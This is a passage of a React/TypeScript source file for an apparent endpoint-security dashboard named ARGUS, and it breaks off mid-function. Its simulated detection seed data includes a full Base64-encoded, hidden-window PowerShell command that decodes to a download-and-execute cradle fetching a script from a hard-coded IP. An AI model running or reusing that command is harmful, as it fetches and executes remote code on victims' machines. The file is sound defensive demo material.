import { useCallback, useEffect, useMemo, useRef, useState, type CSSProperties, type ReactNode } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { TooltipProvider } from '@/components/ui/tooltip';
import { Toaster } from '@/components/ui/toaster';
import { ErrorBoundary } from '@/components/error-boundary';
import { Link, Router as WouterRouter, useLocation } from 'wouter';
import {
  Activity, AlertTriangle, Archive, ArrowLeft,
  ArrowRight, Bell, BrainCircuit, Check, CheckCircle2,
  CircleHelp, ClipboardCheck, Clock3, Cloud,
  Cpu, Database, Download, Eye, FileKey2,
  FileSearch, FileText, Fingerprint, FlaskConical, FolderOpen, Globe2,
  History, Info, Laptop, LayoutDashboard, LockKeyhole, LogOut, Menu, Network,
  Pause, Play, Plus, RefreshCw, Radar, Search, Send, Settings2, Shield,
  ShieldAlert, ShieldCheck, SlidersHorizontal, Sparkles, TerminalSquare,
  Trash2, Wifi, X, Zap, Radio, ExternalLink, GitBranch, Compass
} from 'lucide-react';
import { useProcessMonitor, type RealProcessEvent, type RealProcessInfo } from '@/hooks/use-process-monitor';
import { useAutonomousDemo, DEMO_STEP, DEMO_DASHBOARD_DURATION_MS, type AutonomousDemoState, type DemoRunState } from '@/hooks/use-autonomous-demo';
import { useDetections, type DetectionStatus, type Detection } from '@/hooks/use-detections';
import { useTelemetryStream } from '@/hooks/use-telemetry-stream';
import { useNetworkMonitor, type RealNetworkConnection, type RealNetworkSnapshot } from '@/hooks/use-network-monitor';
import { useNetworkTopology, type NetworkTopologyData, type TopologyConnection } from '@/hooks/use-network-topology';
import { usePortIntelligence, type PortIntelligenceData, type PortEvent } from '@/hooks/use-port-intelligence';
import { useSimulatedNetwork, type NetworkMode } from '@/hooks/use-simulated-network';
import { NetworkUniverse3D, buildUniverseModel } from '@/components/network-universe-3d';
import { UniverseInspector } from '@/components/universe-inspector';
import { UniverseEventTimeline } from '@/components/universe-event-timeline';
import { UniversePortsPanel } from '@/components/universe-ports-panel';
import { UniverseStatusBar } from '@/components/universe-status-bar';
import { UniverseStatsPanel } from '@/components/universe-stats-panel';
import { PortIntelligencePanel } from '@/components/port-intelligence-panel';
import type { UniverseNode } from '@/components/network-universe-types';
import { useThreatAnalysis, type LiveThreat } from '@/hooks/use-threat-analysis';
import { useFileScan } from '@/hooks/use-file-scan';
import { LiveChart } from '@/motion/live-chart';
import NotFound from '@/pages/not-found';
import MonitoringPage from '@/pages/monitoring-page';
import ProcessesPage from '@/pages/processes-page';
import ActivationScreen from '@/components/activation/activation-screen';
import { hasActivationMarker, fetchActivationStatus, deactivate } from '@/lib/activation';
import FilesPage from '@/pages/files-page';
import ExposurePage from '@/pages/exposure-page';
import TimelinePage from '@/pages/timeline-page';
import AttackTracePage from '@/pages/attack-trace-page';
import ExposureWindowPage from '@/pages/exposure-window-page';
import QuarantinePage from '@/pages/quarantine-page';
import IntelligencePage from '@/pages/intelligence-page';
import ReportsPage from '@/pages/reports-page';
import HistoryPage from '@/pages/history-page';
import CyberCellPage from '@/pages/cyber-cell-page';
import BacktraceInvestigationPage from '@/pages/backtrace-investigation-page';
import AutoRemediationPage from '@/pages/auto-remediation-page';
import { ThreatsPage } from '@/pages/threats-page';
import { DashboardPage } from '@/pages/dashboard-page';
import LabPage from '@/pages/lab-page';
import { useQuarantine } from '@/hooks/use-quarantine';
import { useReports } from '@/hooks/use-reports';

const queryClient = new QueryClient();

type Severity = 'critical' | 'high' | 'medium' | 'low';
type ThreatStatus = 'detected' | 'contained' | 'quarantined' | 'resolved';
type EvidenceStatus = 'observed' | 'potential' | 'confirmed';
type ModalState = { title: string; body: string; confirm: string; danger?: boolean; onConfirm: () => void } | null;

type Threat = {
  id: string; name: string; severity: Severity; className: string; timestamp: string;
  path: string; process: string; hash: string; reason: string; status: ThreatStatus;
};
type FileRecord = { id: string; timestamp: string; process: string; path: string; operation: string; classification: string; risk: Severity };
type Connection = { id: string; process: string; local: string; destination: string; domain: string; port: number; protocol: string; time: string; bytes: string; frequency: string; risk: Severity; location: string };
type TimelineEvent = { id: string; time: string; title: string; detail: string; category: string; status: EvidenceStatus };
type QuarantineItem = { id: string; name: string; path: string; date: string; source: string; hash: string; status: string; threatId?: string };

const threatsSeed: Threat[] = [
  { id: 'thr-1', name: 'Suspicious PowerShell execution', severity: 'critical', className: 'Command & Control', timestamp: 'Today, 09:42:18', path: 'C:\\Users\\mira\\AppData\\Local\\Temp\\ps_8F2A.ps1', process: 'powershell.exe', hash: 'a7f1c82e9d04b6f1e3aa92c4', reason: 'Encoded command reached an uncommon external destination', status: 'detected' },
  { id: 'thr-2', name: 'Credential access pattern', severity: 'high', className: 'Credential Access', timestamp: 'Today, 09:41:52', path: 'C:\\Windows\\System32\\lsass.exe', process: 'rundll32.exe', hash: 'd13b77a0c5e19f8b2e410e41', reason: 'Unsigned module opened a protected process handle', status: 'detected' },
  { id: 'thr-3', name: 'Unsigned binary in user profile', severity: 'medium', className: 'Execution', timestamp: 'Today, 09:38:06', path: 'C:\\Users\\mira\\Downloads\\invoice_viewer.exe', process: 'outlook.exe', hash: '63e9d2aa18c7f0b4e5be17', reason: 'First-seen executable with low reputation (spawned via Outlook attachment)', status: 'contained' },
  { id: 'thr-4', name: 'Persistence via Run key', severity: 'medium', className: 'Persistence', timestamp: 'Yesterday, 18:14:22', path: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', process: 'reg.exe', hash: '—', reason: 'New user-level startup value created', status: 'resolved' },
  { id: 'thr-5', name: 'Archive utility accessed', severity: 'low', className: 'Collection', timestamp: 'Yesterday, 17:58:09', path: 'C:\\Program Files\\7-Zip\\7z.exe', process: '7z.exe', hash: '1b44c9e0a27d8e20', reason: 'Archive created in a monitored workspace', status: 'resolved' },
];

const fileSeed: FileRecord[] = [
  { id: 'file-1', timestamp: '09:44:03', process: 'powershell.exe', path: 'C:\\Users\\mira\\Documents\\Acquisition\\Q4_strategy.docx', operation: 'READ', classification: 'Confidential / Strategy', risk: 'critical' },
  { id: 'file-2', timestamp: '09:43:48', process: 'powershell.exe', path: 'C:\\Users\\mira\\Documents\\Finance\\forecast_2025.xlsx', operation: 'READ', classification: 'Restricted / Finance', risk: 'critical' },
  { id: 'file-3', timestamp: '09:43:21', process: 'powershell.exe', path: 'C:\\Users\\mira\\Desktop\\browser_export.csv', operation: 'READ', classification: 'Sensitive / Identity', risk: 'high' },
  { id: 'file-4', timestamp: '09:42:41', process: '7z.exe', path: 'C:\\Users\\mira\\AppData\\Local\\Temp\\~stage_042.zip', operation: 'CREATE', classification: 'Derived archive', risk: 'high' },
  { id: 'file-5', timestamp: '09:40:02', process: 'outlook.exe', path: 'C:\\Users\\mira\\AppData\\Local\\Microsoft\\Outlook\\mailbox.ost', operation: 'READ', classification: 'Internal / Mail', risk: 'medium' },
];

const connectionSeed: Connection[] = [
  { id: 'net-1', process: 'powershell.exe', local: '10.14.8.27:51392', destination: '185.199.110.27:443', domain: 'cdn-sync-check[.]com', port: 443, protocol: 'TLS 1.3', time: '09:44:26', bytes: '18.4 KB', frequency: 'First seen', risk: 'critical', location: 'Frankfurt, DE' },
  { id: 'net-2', process: 'outlook.exe', local: '10.14.8.27:51411', destination: '40.97.146.24:443', domain: 'outlook.office.com', port: 443, protocol: 'TLS 1.3', time: '09:43:10', bytes: '2.1 MB', frequency: 'Regular', risk: 'low', location: 'Dublin, IE' },
  { id: 'net-3', process: 'svchost.exe', local: '10.14.8.27:51381', destination: '13.107.4.50:443', domain: 'windowsupdate.com', port: 443, protocol: 'TLS 1.3', time: '09:41:59', bytes: '640 KB', frequency: 'Regular', risk: 'low', location: 'Ashburn, US' },
  { id: 'net-4', process: 'powershell.exe', local: '10.14.8.27:51402', destination: '91.215.85.19:8080', domain: '—', port: 8080, protocol: 'HTTP', time: '09:42:37', bytes: '4.8 KB', frequency: 'First seen', risk: 'high', location: 'Unknown' },
];

const timelineSeed: TimelineEvent[] = [
  { id: 'tl-1', time: '09:37:14', title: 'Invoice attachment opened', detail: 'User opened invoice_viewer.exe from Downloads. Parent process: explorer.exe → outlook.exe.', category: 'appearance', status: 'observed' },
  { id: 'tl-2', time: '09:37:16', title: 'Child process started', detail: 'invoice_viewer.exe spawned an encoded PowerShell command.', category: 'process', status: 'observed' },
  { id: 'tl-3', time: '09:40:02', title: 'Sensitive document access', detail: 'Mailbox and finance documents read by a process outside the normal access baseline.', category: 'collection', status: 'observed' },
  { id: 'tl-4', time: '09:42:41', title: 'Archive staged', detail: '7z.exe created ~stage_042.zip in the user temp directory.', category: 'staging', status: 'observed' },
  { id: 'tl-5', time: '09:42:37', title: 'Unusual network connection', detail: 'PowerShell connected to 91.215.85.19:8080. First seen destination.', category: 'network', status: 'observed' },
  { id: 'tl-6', time: '09:44:26', title: 'Potential transmission observed', detail: '18.4 KB sent over a newly established TLS session. Content is not directly observable.', category: 'transmission', status: 'potential' },
  { id: 'tl-7', time: '09:46:03', title: 'Detection rule fired', detail: 'ARGUS correlated process, file, and network evidence into a critical incident.', category: 'detection', status: 'observed' },
  { id: 'tl-8', time: '09:47:11', title: 'Endpoint contained', detail: 'Network isolation applied to WS-0427. Existing connections terminated.', category: 'containment', status: 'observed' },
];

const quarantineSeed: QuarantineItem[] = [
  { id: 'q-2', name: 'invoice_viewer.exe', path: 'C:\\Users\\mira\\Downloads\\invoice_viewer.exe', date: 'Yesterday, 18:15:01', source: 'outlook.exe', hash: '63e9d2aa18c7f0b4e5be17', status: 'Quarantined', threatId: 'thr-3' },
];

const containmentQuarantineItems: QuarantineItem[] = [
  { id: 'q-1', name: 'ps_8F2A.ps1', path: 'C:\\Users\\mira\\AppData\\Local\\Temp\\ps_8F2A.ps1', date: 'Today, 09:47:19', source: 'powershell.exe', hash: 'a7f1c82e9d04b6f1e3aa92c4', status: 'Quarantined', threatId: 'thr-1' },
  { id: 'q-3', name: 'rundll32 module handle', path: 'C:\\Windows\\System32\\lsass.exe', date: 'Today, 09:47:19', source: 'rundll32.exe', hash: 'd13b77a0c5e19f8b2e410e41', status: 'Quarantined', threatId: 'thr-2' },
];

const navGroups: Array<{ label: string; items: Array<[string, string, typeof Activity]> }> = [
  { label: 'Observe', items: [
    ['/dashboard', 'Dashboard', LayoutDashboard], ['/threats', 'Threats', ShieldAlert], ['/auto-remediation', 'Auto Remediation', Zap], ['/detections', 'Detections', ShieldCheck], ['/monitoring', 'Monitoring', Activity],
    ['/processes', 'Processes', TerminalSquare], ['/files', 'Files', FileSearch],     ['/network', 'Network Universe', Network],
  ]},
  { label: 'Investigate', items: [
    ['/exposure', 'Exposure assessment', Eye], ['/attack-trace', 'Live Attack Trace', GitBranch], ['/backtrace', '3D Backtrace', Compass], ['/exposure-window', 'Exposure window', Clock3], ['/timeline', 'Forensic timeline', History],
    ['/quarantine', 'Quarantine', Archive], ['/intelligence', 'Intelligence', BrainCircuit],
    ['/lab', 'Lab Simulation', FlaskConical],
  ]},
  { label: 'Decide', items: [
    ['/reports', 'Reports', FileText], ['/history', 'Report history', ClipboardCheck], ['/cyber-cell', 'Cyber Cell', Send],
  ]},
];

function cn(...values: Array<string | false | undefined>) { return values.filter(Boolean).join(' '); }

function shortHash(hash: string) {
  if (!hash || hash === '—') return '—';
  if (hash.length <= 12) return hash;
  return `${hash.slice(0, 4)}…${hash.slice(-4)}`;
}

function downloadTextFile(filename: string, contents: string, mime = 'text/plain') {
  const blob = new Blob([contents], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.rel = 'noopener';
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

function investigateRouteForThreat(threat: Threat): string {
  if (/network|c2|command/i.test(threat.className + threat.reason)) return '/network';
  if (/credential|lsass|rundll/i.test(threat.process + threat.path + threat.className)) return '/processes';
  if (/file|archive|collection|path/i.test(threat.className + threat.reason)) return '/files';
  if (threat.process === 'powershell.exe') return '/processes';
  return '/timeline';
}

function IconLabel({ icon: Icon, children }: { icon: typeof Activity; children: ReactNode }) {
  return <><Icon className="nav-icon" />{children}</>;
}

function Badge({ value }: { value: string }) {
  const tone = value.toLowerCase().replace(/ /g, '-') as string;
  return <span className={cn('badge', tone === 'critical' ? 'badge-critical' : tone === 'high' ? 'badge-high' : tone === 'medium' ? 'badge-medium' : tone === 'low' || tone === 'safe' || tone === 'observed' || tone === 'confirmed' ? 'badge-low' : tone === 'potential' ? 'badge-high' : 'badge-muted')}>{value}</span>;
}

/** Status badge that animates once whenever an incident/evidence state changes. */
function StateBadge({ value }: { value: string }) {
  const tone = value.toLowerCase().replace(/ /g, '-') as string;
  return (
    <span
      key={value}
      className={cn('badge incident-card-enter', tone === 'critical' ? 'badge-critical' : tone === 'high' ? 'badge-high' : tone === 'medium' ? 'badge-medium' : tone === 'low' || tone === 'safe' || tone === 'observed' || tone === 'confirmed' ? 'badge-low' : tone === 'potential' ? 'badge-high' : 'badge-muted')}
    >
      {value}
    </span>
  );
}

function Button({ children, onClick, kind = '', icon: Icon, disabled, testId, type = 'button', style }: { children: ReactNode; onClick?: () => void; kind?: string; icon?: typeof Activity; disabled?: boolean; testId?: string; type?: 'button' | 'submit'; style?: CSSProperties }) {
  return <button type={type} disabled={disabled} data-testid={testId} style={style} className={cn('btn', kind && `btn-${kind}`)} onClick={onClick}>{Icon && <Icon size={14} />}{children}</button>;
}

function Card({ children, className = '', testId, style }: { children: ReactNode; className?: string; testId?: string; style?: CSSProperties }) {
  return <section className={cn('card', className)} style={style} data-testid={testId}>{children}</section>;
}

function PanelTitle({ title, detail, action }: { title: string; detail?: string; action?: ReactNode }) {
  return <div className="panel-title"><h2>{title}</h2><div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>{detail && <span>{detail}</span>}{action}</div></div>;
}

function EvidenceLegend() {
  return <div style={{ display: 'flex', alignItems: 'center', gap: 14, fontSize: 10, color: 'hsl(var(--muted-foreground))' }} data-testid="legend-evidence"><span style={{ fontWeight: 700, color: 'hsl(var(--foreground))' }}>Evidence model</span><span><i className="event-dot" style={{ display: 'inline-block', verticalAlign: 'middle', margin: '0 6px 1px 0' }} />Observed</span><span><i className="event-dot" style={{ display: 'inline-block', verticalAlign: 'middle', margin: '0 6px 1px 0', background: 'hsl(var(--chart-3))', boxShadow: 'none' }} />Potential / inferred</span></div>;
}

function Sidebar({ location, open, onClose, onLogout, userName, monitorConnected, threatCount, detectionCount }: { location: string; open: boolean; onClose: () => void; onLogout: () => void; userName: string; monitorConnected: boolean; threatCount: number; detectionCount: number }) {
  const initials = userName.trim().split(/\s+/).map((p) => p[0] || '').slice(0, 2).join('').toUpperCase() || 'AN';
  return <aside className={cn('sidebar', open && 'open')}>
    <div className="brand"><div className="brand-mark"><Radar size={17} /></div><div><div className="brand-word">ARGUS</div><div className="brand-sub">SECURITY INTELLIGENCE</div></div><button className="btn btn-ghost mobile-only" style={{ marginLeft: 'auto', padding: 4 }} onClick={onClose} data-testid="button-close-nav"><X size={16} /></button></div>
    <div style={{ padding: '0 12px' }}><div className={cn('badge', monitorConnected ? 'badge-low' : 'badge-muted')} style={{ width: '100%', justifyContent: 'center', padding: '7px' }}><span className="event-dot" style={{ width: 5, height: 5, minWidth: 5, margin: 0, background: monitorConnected ? 'hsl(var(--accent))' : 'hsl(var(--muted-foreground))', boxShadow: 'none' }} />&nbsp; {monitorConnected ? 'SENSOR NETWORK OPERATIONAL' : 'SENSOR NETWORK STANDBY'}</div></div>
    <nav style={{ padding: '4px 12px', overflow: 'auto' }}>
      {navGroups.map((group) => <div key={group.label}><div className="nav-section">{group.label}</div>{group.items.map(([href, label, Icon]) => <Link href={href} key={href} className={cn('nav-item', location === href ? 'active' : '')} onClick={onClose} data-testid={`link-nav-${label.toLowerCase().replace(/ /g, '-')}`}><IconLabel icon={Icon as typeof Activity}>{label}</IconLabel>{href === '/threats' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--destructive))' }}>{String(threatCount).padStart(2, '0')}</span>}{href === '/detections' && <span style={{ marginLeft: 'auto', font: '10px var(--app-font-mono)', color: 'hsl(var(--primary))' }}>{String(detectionCount).padStart(2, '0')}</span>}{href === '/auto-remediation' && <span style={{ marginLeft: 'auto', font: '9px var(--app-font-mono)', padding: '1px 5px', borderRadius: 3, background: 'hsl(38 90% 15%)', color: 'hsl(38 92% 50%)', border: '1px solid hsl(38 90% 30%)' }}>AUTO</span>}</Link>)}</div>)}
    </nav>
    <div className="sidebar-footer"><Link href="/settings" className="nav-item" data-testid="link-nav-settings"><IconLabel icon={Settings2}>Settings</IconLabel></Link><Link href="/about" className="nav-item" data-testid="link-nav-about"><IconLabel icon={CircleHelp}>About ARGUS</IconLabel></Link><div className="user-chip"><div className="avatar">{initials}</div><div style={{ minWidth: 0 }}><div style={{ fontSize: 11, fontWeight: 700 }}>{userName || 'Investigator'}</div><div className="mono muted">Lead investigator</div></div><button type="button" className="btn btn-ghost" style={{ marginLeft: 'auto', padding: 4 }} onClick={onLogout} title="Log out" data-testid="button-logout" aria-label="Log out"><LogOut size={13} /></button></div></div>
  </aside>;
}

function PageHeading({ eyebrow, title, subtitle, actions }: { eyebrow: ReactNode; title: string; subtitle: string; actions?: ReactNode }) {
  return <div className="page-heading"><div><div className="eyebrow">{eyebrow}</div><h1 className="page-title">{title}</h1><p className="page-subtitle">{subtitle}</p></div>{actions && <div className="actions">{actions}</div>}</div>;
}

function StatCard({ label, value, note, tone = 'info', icon: Icon }: { label: string; value: string; note: string; tone?: string; icon?: typeof Activity }) {
  return <Card className="metric animate-rise"><div className="metric-label">{Icon && <Icon size={13} style={{ verticalAlign: 'middle', marginRight: 6 }} />}{label}</div><div className={cn('metric-value', `signal-${tone}`)} data-testid={`text-metric-${label.toLowerCase().replace(/ /g, '-')}`}>{value}</div><div className="metric-note">{note}</div></Card>;
}

/** Ticking clock isolated so the rest of the Dashboard does not re-render at 1 Hz. */
function LiveClock() {
  const [label, setLabel] = useState(() => formatDashboardClock(new Date()));
  useEffect(() => {
    const timer = window.setInterval(() => setLabel(formatDashboardClock(new Date())), 1000);
    return () => window.clearInterval(timer);
  }, []);
  return <>{label}</>;
}

// Dashboard extracted to @/pages/dashboard-page


// ThreatsPage extracted to @/pages/threats-page


function fmtBytes(bytes?: number): string {
  if (bytes == null) return '—';
  if (bytes >= 1073741824) return `${(bytes / 1073741824).toFixed(1)} GB`;
  if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(1)} MB`;
  return `${(bytes / 1024).toFixed(0)} KB`;
}

function greetingForHour(h: number): string {
  if (h < 12) return 'Good morning';
  if (h < 18) return 'Good afternoon';
  return 'Good evening';
}

function formatDashboardClock(d: Date): string {
  const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
  const time = d.toLocaleTimeString([], { hour12: false });
  return `${days[d.getDay()]} · ${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()} · ${time}`;
}

function fmtTime(t?: string): string {
  if (!t) return '—';
  try { return new Date(t).toLocaleTimeString(); } catch { return '—'; }
}

function fmtUptime(seconds?: number): string {
  if (seconds == null) return '—';
  const d = Math.floor(seconds / 86400);
  const h = Math.floor((seconds % 86400) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  if (d > 0) return `${d}d ${h}h ${m}m`;
  if (h > 0) return `${h}h ${m}m ${s}s`;
  if (m > 0) return `${m}m ${s}s`;
  return `${s}s`;
}

// MonitoringPage extracted to @/pages/monitoring-page
// ProcessesPage extracted to @/pages/processes-page
// FilesPage extracted to @/pages/files-page

const DETECTION_STATUS_FLOW: DetectionStatus[] = ['observed', 'detected', 'investigated', 'contained', 'resolved'];

/** Detection rule domains (rule_id prefix before the first dash). */
function domainOf(ruleId: string): string {
  const idx = ruleId.indexOf('-');
  return idx > 0 ? ruleId.slice(0, idx) : "?";
}

function DetectionLifecycle({ status, onChange, testPrefix }: { status: DetectionStatus; onChange: (s: DetectionStatus) => void; testPrefix: string }) {
  return <div className="actions" style={{ flexWrap: 'wrap' }}>{DETECTION_STATUS_FLOW.map((s) => {
    const active = s === status;
    return <Button key={s} kind={active ? 'primary' : ''} icon={active ? Check : s === 'contained' || s === 'resolved' ? ShieldCheck : undefined} disabled={active} onClick={() => !active && onChange(s)} testId={`${testPrefix}-status-${s}`}>{s}</Button>;
  })}</div>;
}

const simulatedDetectionsSeed: Detection[] = [
  {
    id: 'sim-det-1',
    rule_id: 'PROC-002-ENCODED-COMMAND-LINE',
    rule_name: 'Encoded or obfuscated command line',
    title: 'powershell.exe executed with Base64 encoded payload',
    explanation: 'powershell.exe (pid 8412) was invoked with an encoded script block (-enc / -EncodedCommand) designed to hide C2 staging logic from endpoint auditing logs.',
    recommended_action: 'Decode and inspect the Base64 script payload. Isolate the host WS-0427 from the internal network and revoke any active credentials associated with this session.',
    severity: 'critical',
    confidence: 0.92,
    status: 'detected',
    entity: 'powershell.exe',
    pid: 8412,
    executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    command_line: 'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADEANQA0AC4AMgA1ADUALgA4ADgAOgA4ADAAOAAwAC8AYgAuAHAAcwAxACcAKQA=',
    parent_pid: 6230,
    parent_process_name: 'cmd.exe',
    username: 'SYSTEM',
    hostname: 'WS-0427',
    timestamp: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
    evidence: [
      { key: 'encoded_marker', description: 'Base64 encoded parameter (-enc) detected in command line invocation', source: 'command_line', detail: '-enc SQBFAFgAKABOAGUAdwAt...' },
      { key: 'decoded_cradle', description: 'Decodes to IEX (New-Object Net.WebClient).DownloadString(\'http://45.154.255.88:8080/b.ps1\')', source: 'deobfuscation', detail: 'External C2 staging endpoint' },
    ],
    correlated_rules: ['PROC-001-SUSPICIOUS-PARENT-CHILD', 'PROC-002-ENCODED-COMMAND-LINE', 'PROC-006-DOWNLOAD-EXECUTE'],
    ancestry: [
      { pid: 4100, process_name: 'explorer.exe', executable_path: 'C:\\Windows\\explorer.exe', command_line: null, username: 'analyst' },
      { pid: 6230, process_name: 'cmd.exe', executable_path: 'C:\\Windows\\System32\\cmd.exe', command_line: 'cmd.exe /c start', username: 'analyst' },
      { pid: 8412, process_name: 'powershell.exe', executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -NoP -NonI -W Hidden -enc ...', username: 'analyst' }
    ]
  },
  {
    id: 'sim-det-2',
    rule_id: 'NET-001-USER-WRITABLE-OUTBOUND',
    rule_name: 'Outbound network I/O from a user-writable binary',
    title: 'svchost_update.exe opened outbound C2 channel to 45.154.255.88:4444',
    explanation: 'svchost_update.exe (pid 9344) established an active TCP connection to 45.154.255.88 on port 4444 from a user-writable Temp directory (C:\\Users\\nikhi\\AppData\\Local\\Temp\\).',
    recommended_action: 'Block outbound traffic to 45.154.255.88 immediately at the firewall. Terminate pid 9344 and purge all binary artifacts in AppData\\Local\\Temp.',
    severity: 'critical',
    confidence: 0.89,
    status: 'investigated',
    entity: 'svchost_update.exe',
    pid: 9344,
    executable_path: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe',
    command_line: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe --connect',
    parent_pid: 8412,
    parent_process_name: 'powershell.exe',
    username: 'analyst',
    hostname: 'WS-0427',
    timestamp: new Date(Date.now() - 10 * 60 * 1000).toISOString(),
    evidence: [
      { key: 'writable_path', description: 'Binary executes from user-writable Temp directory', source: 'path', detail: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe' },
      { key: 'c2_socket', description: 'Established TCP socket to 45.154.255.88:4444', source: 'network', detail: '10.102.49.157:51280 -> 45.154.255.88:4444 (ESTABLISHED)' }
    ],
    correlated_rules: ['NET-001-USER-WRITABLE-OUTBOUND', 'NET-002-KNOWN-TOOL-PORT'],
    ancestry: [
      { pid: 8412, process_name: 'powershell.exe', executable_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: null, username: 'analyst' },
      { pid: 9344, process_name: 'svchost_update.exe', executable_path: 'C:\\Users\\Public\\Downloads\\svchost_update.exe', command_line: null, username: 'analyst' }
    ]
  },
  {
    id: 'sim-det-3',
    rule_id: 'FILE-001-STARTUP-PERSISTENCE',
    rule_name: 'Persistent payload in a Windows Startup folder',
    title: 'Persistence script written to Windows Startup directory',
    explanation: 'A script file (win_sync.bat) was created in the Windows Startup directory to achieve persistence across user logons and system reboots.',
    recommended_action: 'Quarantine C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sync.bat and audit related scheduled tasks.',
    severity: 'high',
    confidence: 0.86,
    status: 'detected',
    entity: 'win_sync.bat',
    pid: 9344,
    executable_path: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sync.bat',
    command_line: null,
    parent_pid: null,
    parent_process_name: null,
    username: 'analyst',
    hostname: 'WS-0427',
    timestamp: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
    evidence: [
      { key: 'startup_location', description: 'File placed in per-user Startup directory', source: 'filesystem', detail: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' },
      { key: 'auto_execution', description: 'Batch script executes automatically upon user authentication', source: 'persistence', detail: 'Calls dropped payload svchost_update.exe' }
    ],
    correlated_rules: ['FILE-001-STARTUP-PERSISTENCE'],
    ancestry: []
  },
  {
    id: 'sim-det-4',
    rule_id: 'PROC-007-LOLBIN-EXECUTION',
    rule_name: 'Living-off-the-land binary use',
    title: 'rundll32.exe executed unbacked DLL entrypoint',
    explanation: 'rundll32.exe was executed targeting an unbacked DLL artifact in the Temp directory with ordinal export parameter.',
    recommended_action: 'Terminate rundll32.exe process tree and collect memory dump for malware analysis.',
    severity: 'high',
    confidence: 0.81,
    status: 'observed',
    entity: 'rundll32.exe',
    pid: 10420,
    executable_path: 'C:\\Windows\\System32\\rundll32.exe',
    command_line: 'rundll32.exe C:\\Users\\nikhi\\AppData\\Local\\Temp\\update.dll,#1',
    parent_pid: 9344,
    parent_process_name: 'svchost_update.exe',
    username: 'analyst',
    hostname: 'WS-0427',
    timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
    evidence: [
      { key: 'lolbin_invocation', description: 'rundll32.exe invoked with temp DLL target', source: 'command_line', detail: 'rundll32.exe ... update.dll,#1' }
    ],
    correlated_rules: ['PROC-007-LOLBIN-EXECUTION'],
    ancestry: [
      { pid: 9344, process_name: 'svchost_update.exe', executable_path: 'C:\\Users\\Public\\Downloads\\svchost_update.exe', command_line: null, username: 'analyst' },
      { pid: 10420, process_name: 'rundll32.exe', executable_path: 'C:\\Windows\\System32\\rundll32.exe', command_line: null, username: 'analyst' }
    ]
  }
];

function DetectionsPage({ detections, toast, setLocation }: { detections: ReturnType<typeof useDetections>; toast: (t: string, b: string) => void; setLocation: (path: string) => void }) {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [query, setQuery] = useState('');
  const [sevFilter, setSevFilter] = useState('all');
  const [domainFilter, setDomainFilter] = useState('all');
  const [ruleFilter, setRuleFilter] = useState('all');
  const [mode, setMode] = useState<'live' | 'simulated'>('live');
  const [isProbing, setIsProbing] = useState(false);
  const [simDetections, setSimDetections] = useState<Detection[]>(simulatedDetectionsSeed);

  const live = detections.hasData;
  const liveHostName = detections.detections[0]?.hostname || 'This Device';

  // Auto-switch mode based on live sensor engine data vs simulation
  useEffect(() => {
    if (live) {
      setMode('live');
    } else {
      setMode('simulated');
    }
  }, [live]);

  const activeList = mode === 'live' ? detections.detections : simDetections;

  // Selected detection resolution
  const selectedLive = detections.selected && detections.selected.detection.id === selectedId ? detections.selected : null;
  const selectedSim = mode === 'simulated' ? simDetections.find(d => d.id === selectedId) : null;
  const selected = selectedLive || (selectedSim ? {
    detection: selectedSim,
    related: simDetections.filter(d => d.pid === selectedSim.pid && d.id !== selectedSim.id),
    process: {
      pid: selectedSim.pid,
      process_name: selectedSim.entity,
      executable_path: selectedSim.executable_path,
      command_line: selectedSim.command_line,
      username: selectedSim.username,
      parent_pid: selectedSim.parent_pid,
      parent_process_name: selectedSim.parent_process_name,
    },
    ancestry: selectedSim.ancestry || [],
  } : null);

  const filtered = activeList.filter((d) =>
    (sevFilter === 'all' || d.severity === sevFilter) &&
    (domainFilter === 'all' || domainOf(d.rule_id) === domainFilter) &&
    (ruleFilter === 'all' || d.rule_id === ruleFilter) &&
    `${d.title} ${d.entity} ${d.rule_name} ${d.explanation} ${d.pid}`.toLowerCase().includes(query.trim().toLowerCase())
  );

  const updateStatus = async (id: string, status: DetectionStatus) => {
    if (mode === 'live') {
      const ok = await detections.updateStatus(id, status);
      toast(ok ? 'Status updated' : 'Update failed', `${id} marked ${status}.`);
    } else {
      setSimDetections(prev => prev.map(d => d.id === id ? { ...d, status } : d));
      toast('Detection updated', `${id} transitioned to ${status}.`);
    }
  };

  const runProbe = async () => {
    try {
      setIsProbing(true);
      const res = await fetch('/api/detections/probe', { method: 'POST' });
      if (res.ok) {
        const data = await res.json();
